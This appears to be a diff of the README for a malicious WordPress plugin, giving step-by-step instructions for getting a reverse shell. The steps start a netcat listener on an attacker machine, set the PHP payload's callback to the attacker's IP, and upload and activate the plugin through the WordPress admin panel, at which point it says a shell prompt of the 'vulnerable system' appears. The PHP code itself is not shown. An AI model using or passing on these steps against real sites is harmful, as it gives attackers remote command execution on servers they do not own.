@@ -3,10 +3,13 @@
 
 Instructions:
 
-1.) Zip up php file.
+1.) Setup listening port with netcat from attacker machine: netcat -lv 0.0.0.0 -p 8080
 
-2.) Navigate:
-WP UI -> Plugins -> Add New -> Upload Plugin -> Browse -> Install Now -> Activate Plugin
+2.) Change loopback to IP of netcat attacker machine.
 
-3.) Setup listening port with netcat from attacker machine:
-netcat -lv 0.0.0.0 -p 8080
+3.) Zip up php file.
+
+4.) Navigate: WP UI -> Plugins -> Add New -> Upload Plugin -> Browse -> Install Now -> Activate Plugin
+    (note: WP UI activation page will appear as if it is loading/refreshing indefinitely)
+
+5.) Immediately at plugin activation: reverse shell will display prompt of vulnerable system.
